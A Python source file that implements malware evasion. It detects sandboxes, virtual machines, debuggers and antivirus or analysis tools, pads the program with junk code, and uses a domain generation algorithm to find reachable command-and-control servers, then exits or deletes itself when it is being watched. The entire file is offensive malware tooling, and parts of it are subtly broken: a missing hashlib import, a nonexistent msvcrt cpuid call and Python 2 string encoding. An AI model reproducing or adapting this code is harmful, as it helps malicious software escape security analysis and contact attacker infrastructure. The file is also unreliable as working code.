# evasion_techniques.py
import os
import sys
import time
import random
import threading
import subprocess
import psutil
import socket
import requests
from datetime import datetime, timedelta

class EvasionTechniques:
    def __init__(self):
        self.is_running = True
        self.sandbox_detected = False
        self.analysis_detected = False
        
    def check_sandbox(self):
        """Check if running in a sandbox environment"""
        try:
            # Check for common sandbox artifacts
            sandbox_indicators = [
                # Files
                '/proc/vz',
                '/proc/bc',
                '/proc/xen',
                '/usr/bin/qemu-ga',
                '/usr/bin/vmware-toolbox-cmd',
                '/usr/bin/VBoxService',
                '/usr/bin/VBoxControl',
                
                # Registry keys (Windows)
                'HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer',
                'HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemProductName',
                'HKEY_LOCAL_MACHINE\\SOFTWARE\\VMware, Inc.\\VMware Tools',
                'HKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions',
                
                # MAC addresses
                '00:0C:29',  # VMware
                '00:50:56',  # VMware
                '08:00:27',  # VirtualBox
                '00:1C:42',  # Parallels
                '00:0F:4B',  # Virtual Iron
                '00:16:3E',  # Xen
            ]
            
            # Check files
            for file_path in sandbox_indicators[:8]:
                if os.path.exists(file_path):
                    self.sandbox_detected = True
                    return True
            
            # Check MAC addresses
            interfaces = psutil.net_if_addrs()
            for interface, addrs in interfaces.items():
                for addr in addrs:
                    if addr.family == socket.AF_LINK:
                        mac = addr.address.upper()
                        for indicator in sandbox_indicators[8:]:
                            if indicator.upper() in mac:
                                self.sandbox_detected = True
                                return True
            
            # Check for common sandbox usernames
            username = os.getlogin()
            sandbox_users = ['sandbox', 'malware', 'test', 'virus', 'sample', 'analysis']
            if username.lower() in sandbox_users:
                self.sandbox_detected = True
                return True
            
            # Check for common sandbox hostnames
            hostname = socket.gethostname()
            sandbox_hostnames = ['sandbox', 'malware', 'test', 'virus', 'sample', 'analysis', 'vm']
            if hostname.lower() in sandbox_hostnames:
                self.sandbox_detected = True
                return True
            
            # Check for small disk size (common in sandboxes)
            disk_usage = psutil.disk_usage('/')
            if disk_usage.total < 10 * 1024 * 1024 * 1024:  # Less than 10GB
                self.sandbox_detected = True
                return True
            
            # Check for small RAM size (common in sandboxes)
            memory = psutil.virtual_memory()
            if memory.total < 1 * 1024 * 1024 * 1024:  # Less than 1GB
                self.sandbox_detected = True
                return True
            
            # Check for few CPU cores (common in sandboxes)
            cpu_count = psutil.cpu_count()
            if cpu_count < 2:
                self.sandbox_detected = True
                return True
            
            # Check for recent system boot (common in sandboxes)
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.now() - boot_time
            if uptime < timedelta(minutes=10):
                self.sandbox_detected = True
                return True
            
            return False
            
        except Exception as e:
            print(f"Error checking sandbox: {e}")
            return False
    
    def check_analysis_tools(self):
        """Check for running analysis tools"""
        try:
            # Common analysis tool processes
            analysis_processes = [
                'wireshark', 'tcpdump', 'procmon', 'processhacker', 'sysinternals',
                'ida', 'idaq', 'ida64', 'ollydbg', 'x64dbg', 'windbg', 'immunity',
                'fiddler', 'burp', 'charles', 'snoop', 'sniffer', 'monitor',
                'vmsnap', 'snapshot', 'snapshotter', 'analyzer', 'sandbox',
                ' cuckoo', 'joe', 'hybrid', 'comodo', 'sophos', 'kaspersky',
                'symantec', 'mcafee', 'trendmicro', 'eset', 'avast', 'avg'
            ]
            
            # Check running processes
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    for tool in analysis_processes:
                        if tool in proc_name:
                            self.analysis_detected = True
                            return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            
            # Check for loaded modules (Windows)
            if sys.platform == 'win32':
                try:
                    import win32api
                    import win32process
                    import win32con
                    
                    # Get current process
                    handle = win32api.GetCurrentProcess()
                    
                    # Enumerate modules
                    modules = win32process.EnumProcessModules(handle)
                    
                    for module in modules:
                        try:
                            module_name = win32process.GetModuleFileNameEx(handle, module)
                            module_name = os.path.basename(module_name).lower()
                            
                            for tool in analysis_processes:
                                if tool in module_name:
                                    self.analysis_detected = True
                                    return True
                        except:
                            pass
                except ImportError:
                    pass
            
            return False
            
        except Exception as e:
            print(f"Error checking analysis tools: {e}")
            return False
    
    def anti_debug(self):
        """Anti-debugging techniques"""
        try:
            # Check for debugger using ptrace (Linux)
            if sys.platform == 'linux':
                try:
                    import ctypes
                    libc = ctypes.CDLL('libc.so.6')
                    result = libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME
                    if result == -1:
                        self.analysis_detected = True
                        return True
                except:
                    pass
            
            # Check for debugger using IsDebuggerPresent (Windows)
            if sys.platform == 'win32':
                try:
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    if kernel32.IsDebuggerPresent():
                        self.analysis_detected = True
                        return True
                except:
                    pass
            
            # Check for debugger using timing attacks
            start_time = time.time()
            for _ in range(10000):
                pass
            end_time = time.time()
            
            # If execution took too long, might be running under debugger
            if end_time - start_time > 0.01:
                self.analysis_detected = True
                return True
            
            return False
            
        except Exception as e:
            print(f"Error in anti-debug: {e}")
            return False
    
    def anti_vm(self):
        """Anti-virtualization techniques"""
        try:
            # Check for VM-specific CPU instructions
            if sys.platform == 'win32':
                try:
                    import ctypes
                    
                    # Define CPUID function
                    def cpuid(eax, ecx=0):
                        # Create buffer for registers
                        buffer = (ctypes.c_uint * 4)()
                        
                        # Inline assembly for CPUID
                        ctypes.windll.msvcrt.cpuid(ctypes.byref(buffer), eax, ecx)
                        
                        return buffer[0], buffer[1], buffer[2], buffer[3]
                    
                    # Check for hypervisor bit
                    eax, ebx, ecx, edx = cpuid(1)
                    if ecx & (1 << 31):  # Hypervisor bit
                        self.sandbox_detected = True
                        return True
                    
                    # Check for hypervisor vendor string
                    eax, ebx, ecx, edx = cpuid(0x40000000)
                    if eax >= 0x40000000:
                        # Extract vendor string
                        vendor = ""
                        vendor += ctypes.create_string_buffer(4, ebx).raw.decode()
                        vendor += ctypes.create_string_buffer(4, ecx).raw.decode()
                        vendor += ctypes.create_string_buffer(4, edx).raw.decode()
                        
                        # Check for known hypervisor vendors
                        vm_vendors = ['VMware', 'Xen', 'KVM', 'Microsoft Hv', 'VirtualBox']
                        for vm in vm_vendors:
                            if vm in vendor:
                                self.sandbox_detected = True
                                return True
                    
                except:
                    pass
            
            # Check for VM-specific devices
            if sys.platform == 'linux':
                try:
                    # Check for VM-specific devices in /proc
                    vm_devices = [
                        '/proc/scsi/scsi',  # VMware
                        '/proc/bus/pci/devices',  # Virtual devices
                        '/proc/modules'  # VM modules
                    ]
                    
                    for device in vm_devices:
                        if os.path.exists(device):
                            with open(device, 'r') as f:
                                content = f.read().lower()
                                if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'xen', 'kvm']):
                                    self.sandbox_detected = True
                                    return True
                except:
                    pass
            
            return False
            
        except Exception as e:
            print(f"Error in anti-vm: {e}")
            return False
    
    def anti_disassembly(self):
        """Anti-disassembly techniques"""
        try:
            # Insert junk code to confuse disassemblers
            def junk_code():
                # Useless arithmetic operations
                a = 12345
                b = 54321
                c = a + b
                d = a * b
                e = a - b
                f = a / b
                g = a % b
                
                # Useless bit operations
                h = a & b
                i = a | b
                j = a ^ b
                k = ~a
                l = a << 1
                m = a >> 1
                
                # Useless string operations
                n = str(a)
                o = n + str(b)
                p = o.replace('1', '2')
                q = p.upper()
                r = q.lower()
                
                # Return nothing useful
                return None
            
            # Execute junk code
            junk_code()
            
            # Insert obfuscated code
            def obfuscated_code():
                # Obfuscated string
                s = '\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64'
                # XOR decryption
                decrypted = ''.join(chr(ord(c) ^ 0xFF) for c in s)
                # More operations
                result = decrypted[::-1].encode('hex')
                # Return nothing useful
                return None
            
            # Execute obfuscated code
            obfuscated_code()
            
            return True
            
        except Exception as e:
            print(f"Error in anti-disassembly: {e}")
            return False
    
    def domain_generation_algorithm(self, seed, date=None):
        """Generate domain names for C2 communication"""
        try:
            if not date:
                date = datetime.now()
            
            # Extract date components
            year = date.year
            month = date.month
            day = date.day
            
            # Create seed string
            seed_str = f"{seed}{year}{month:02d}{day:02d}"
            
            # Generate domains
            domains = []
            for i in range(10):
                # Calculate hash
                hash_value = int(hashlib.md5((seed_str + str(i)).encode()).hexdigest(), 16)
                
                # Extract TLD
                tlds = ['com', 'net', 'org', 'info', 'biz', 'ru', 'cn', 'uk', 'de', 'fr']
                tld_index = hash_value % len(tlds)
                tld = tlds[tld_index]
                
                # Generate domain name
                domain_length = 8 + (hash_value % 8)
                domain_chars = []
                
                for j in range(domain_length):
                    hash_value = (hash_value * 1103515245 + 12345) & 0x7fffffff
                    char_index = hash_value % 26
                    domain_chars.append(chr(ord('a') + char_index))
                
                domain = ''.join(domain_chars) + '.' + tld
                domains.append(domain)
            
            return domains
            
        except Exception as e:
            print(f"Error in domain generation: {e}")
            return []
    
    def check_c2_domains(self, domains):
        """Check which C2 domains are reachable"""
        try:
            reachable_domains = []
            
            for domain in domains:
                try:
                    # Try to resolve domain
                    socket.gethostbyname(domain)
                    reachable_domains.append(domain)
                except:
                    pass
            
            return reachable_domains
            
        except Exception as e:
            print(f"Error checking C2 domains: {e}")
            return []
    
    def run(self):
        """Run evasion techniques"""
        try:
            # Check for sandbox
            if self.check_sandbox():
                print("Sandbox detected!")
                # Take evasive action
                self.evasive_action()
                return
            
            # Check for analysis tools
            if self.check_analysis_tools():
                print("Analysis tools detected!")
                # Take evasive action
                self.evasive_action()
                return
            
            # Check for debugger
            if self.anti_debug():
                print("Debugger detected!")
                # Take evasive action
                self.evasive_action()
                return
            
            # Check for VM
            if self.anti_vm():
                print("VM detected!")
                # Take evasive action
                self.evasive_action()
                return
            
            # Run anti-disassembly techniques
            self.anti_disassembly()
            
            # Generate and check C2 domains
            seed = "my_secret_seed"
            domains = self.domain_generation_algorithm(seed)
            reachable_domains = self.check_c2_domains(domains)
            
            if not reachable_domains:
                print("No reachable C2 domains!")
                # Take evasive action
                self.evasive_action()
                return
            
            print(f"Reachable C2 domains: {reachable_domains}")
            return reachable_domains
            
        except Exception as e:
            print(f"Error in evasion techniques: {e}")
            return []
    
    def evasive_action(self):
        """Take evasive action when detection occurs"""
        try:
            # Option 1: Exit silently
            sys.exit(0)
            
            # Option 2: Crash the process
            # os.abort()
            
            # Option 3: Enter infinite loop
            # while True:
            #     pass
            
            # Option 4: Delete self
            # try:
            #     os.remove(sys.argv[0])
            # except:
            #     pass
            # sys.exit(0)
            
            # Option 5: Show fake error message
            # print("Error: Application failed to initialize properly (0xc0000005).")
            # sys.exit(1)
            
        except Exception as e:
            print(f"Error in evasive action: {e}")
            sys.exit(0)

# Main execution
if __name__ == "__main__":
    evasion = EvasionTechniques()
    evasion.run()
